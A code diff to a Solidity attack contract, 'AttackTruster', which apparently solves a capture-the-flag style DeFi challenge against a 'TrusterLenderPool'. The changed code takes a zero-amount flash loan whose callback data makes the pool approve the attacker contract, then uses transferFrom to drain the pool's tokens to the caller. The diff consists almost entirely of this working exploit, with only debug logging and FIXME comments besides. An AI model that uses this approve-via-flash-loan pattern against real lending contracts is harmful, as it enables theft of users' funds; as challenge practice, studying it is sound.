@@ -19,18 +19,15 @@ contract AttackTruster {
         pool = TrusterLenderPool(poolAddress);
         owner = msg.sender;
     }
-
-    function exploit(address token, uint256 amount) external {
-        console.logBytes(msg.data);
-        console.log(token);
-        console.log(amount);
-        IERC20(token).approve(owner, amount); // FIXME:
-    }
     
     function executeFlashLoan(address token, uint256 amount) external {
         require(msg.sender == owner, "Only owner can execute flash loan");
-        // bytes memory data = abi.encodeWithSignature('IERC20(token).approve(address,uint256)', owner, amount);
-        bytes memory data = abi.encodeWithSignature('exploit(address,uint256)', token, amount); // FIXME:
-        pool.flashLoan(0, owner, address(this), data); // FIXME:
+        bytes memory data = abi.encodeWithSignature('approve(address,uint256)', address(this), amount); // FIXME:
+        pool.flashLoan(0, address(this), token, data); 
+        console.log(
+            "Allowance for this contract:",
+            IERC20(token).allowance(address(pool), address(this))
+        );
+        IERC20(token).transferFrom(address(pool), msg.sender, amount);
     }
 }
